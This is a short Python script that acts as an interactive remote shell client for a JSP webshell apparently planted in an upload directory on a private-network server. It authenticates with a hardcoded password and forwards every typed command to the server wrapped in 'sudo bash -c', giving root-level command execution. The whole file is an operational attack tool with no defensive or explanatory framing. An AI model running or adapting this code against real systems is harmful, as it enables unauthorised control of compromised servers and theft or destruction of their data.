import os
from knife import Knife

url = "http://10.3.25.12:8004/rescloud/temp/a2f19f84-4ed9-4935-87ca-abec975ea328.jsp"
k = Knife(url, 'twsm')
cwd = k.exec('pwd')

while True:
    cmd = input('$ ').strip()
    if cmd == 'exit':
        break
    elif cmd.startswith('cd'):
        result = k.exec(f'sudo bash -c "cd {cwd} && {cmd} && pwd"')
        if result.startswith('/'):
            cwd = result
        else:
            print(result)
    else:
        cmd = f'sudo bash -c "cd {cwd} && {cmd}"'
        result = k.exec(cmd)
        print(result)
            
